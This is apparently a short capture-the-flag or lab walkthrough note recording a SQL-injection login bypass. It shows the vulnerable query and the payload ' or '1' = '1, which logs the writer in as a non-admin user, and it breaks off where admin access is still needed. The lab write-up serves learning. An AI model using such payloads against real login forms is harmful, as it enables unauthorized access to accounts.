
![[Pasted image 20240529163709.png]]
navigating to `/notes/` redirects to `/login/`, when pressing `ctrl+u` can see sql injection is available.
![[Pasted image 20240529164653.png]]
```sql
SELECT * from users where username = 'input' and password = 'input';
SELECT * from users where username = '' or '1' = '1' and password = '' or '1' = '1';
' or '1' = '1
```
logged in with `' or '1' = '1` in both username and password

![[Pasted image 20240529165039.png]]
need to be logged in as an admin, currently logged in as user adam